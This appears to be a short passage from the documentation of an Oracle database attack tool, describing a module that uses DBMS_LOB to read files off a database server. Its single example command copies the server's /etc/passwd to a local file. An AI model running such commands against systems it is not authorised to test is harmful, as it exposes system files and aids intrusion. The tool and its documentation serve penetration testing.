# Download files

This module uses the DBMS_LOB Oracle library to download files remotely.

* To download the passwd file stored in */etc/* to the tmp.txt local file:
```bash
./odat.py dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile '/etc/' 'passwd' 'temp.txt'
```